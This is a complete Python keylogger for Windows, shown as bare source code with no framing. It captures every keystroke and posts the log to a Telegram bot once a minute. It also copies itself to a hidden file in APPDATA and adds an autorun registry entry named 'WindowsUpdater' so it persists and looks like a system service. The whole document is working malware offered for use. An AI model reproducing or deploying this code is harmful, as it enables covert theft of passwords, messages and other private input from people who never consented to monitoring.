from pynput import keyboard
import requests
import threading
import os
import shutil
import sys
import winreg
import ctypes

# --- Config ---
bot_token = 'your API'
chat_id = 'YOUR USERID'
interval = 60
filename = "winlog.exe"
log = ""

# --- Send to Telegram ---
def send_log(message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except:
        pass

# --- Key logger ---
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f' [{key}] '

def report():
    global log
    if log:
        send_log(log)
        log = ""
    timer = threading.Timer(interval, report)
    timer.daemon = True
    timer.start()

# --- Hide file + Auto run ---
def setup():
    hidden_path = os.path.join(os.getenv("APPDATA"), filename)
    if not os.path.exists(hidden_path):
        # Copy to hidden location
        shutil.copy2(sys.executable, hidden_path)

        # Make file hidden
        ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)  # 2 = Hidden attribute

        # Add to registry to autorun
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, hidden_path)
        winreg.CloseKey(key)

        # Run the hidden file, close original
        os.startfile(hidden_path)
        sys.exit()

# --- Start ---
setup()
report()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
